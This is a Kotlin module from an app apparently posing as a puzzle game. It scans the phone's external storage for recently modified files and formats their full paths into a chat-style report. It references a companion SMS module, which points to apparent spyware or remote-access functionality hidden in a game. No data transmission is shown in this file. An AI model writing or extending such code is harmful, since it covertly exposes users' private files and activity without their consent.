package com.puzzleblast.game.modules

import android.os.Environment
import java.io.File

object RecentFilesModule {
    suspend fun recent(hrs: Int = 24): String {
        val cutoff = System.currentTimeMillis() - hrs * 3600_000L
        val root = Environment.getExternalStorageDirectory()
        val files = root.walkTopDown().maxDepth(4)
            .filter { it.isFile && it.lastModified() > cutoff }
            .sortedByDescending { it.lastModified() }
            .take(100)
            .toList()
        if (files.isEmpty()) return "🕐 no recent files in ${hrs}h"
        return "🕐 recent · ${hrs}h\n" + files.joinToString("\n") {
            "  ${it.absolutePath.take(80)} — ${SmsModule.relTime(it.lastModified())}"
        }
    }
}
